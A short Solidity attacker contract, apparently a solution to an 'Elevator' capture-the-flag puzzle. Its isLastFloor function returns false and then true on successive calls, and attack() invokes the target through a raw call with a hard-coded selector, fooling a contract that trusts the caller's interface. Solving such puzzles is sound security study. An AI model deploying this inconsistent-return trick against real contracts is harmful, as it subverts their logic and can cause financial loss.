pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract NewAttacker {
    bool public isFirstCall = true;
    address public elevator;

    constructor(address _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (isFirstCall) {
            isFirstCall = false;
            return false;
        }
        isFirstCall = true;
        return true;
    }

    function attack() external {
        (bool success, ) = elevator.call(abi.encodeWithSelector(0x243170cd, uint256(0)));
        require(success, "Call failed");
    }
}
